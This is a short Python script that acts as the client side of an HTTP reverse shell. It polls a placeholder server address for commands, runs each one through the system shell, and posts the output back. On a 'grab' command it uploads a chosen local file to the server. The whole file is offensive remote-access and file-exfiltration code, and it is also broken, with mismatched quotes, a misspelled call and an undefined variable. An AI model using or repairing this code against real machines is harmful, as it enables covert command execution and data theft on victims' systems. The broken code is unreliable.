import requests
import subprocess
import time
import os

while True:

	req = requests.get("Server's IP Address") #IP Address of the server
	command = req.text

	if "terminate" in command: #Terminate the reverse shell
		break
	elif "grab" in command: #Send a file to the server
		grab, path = command.split("*")

		if os.path.exists(path):
			url = "Server's IP Address/store"
			files = {"file": open(path, "r")}
			r = requests.post(url, files = files)
		else:
			post_response = request.post(url = "http://Server's IP Address", data = "[-] Not able to find the file!")
	else:
		CMD = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
		post_response = requests.post(url = "Server's IP Address"", data = CMD.stdout.read())
		post_response = requests.post(url = "Server's IP Address"", data = CMD.stderr.read())

	time.sleep(3)
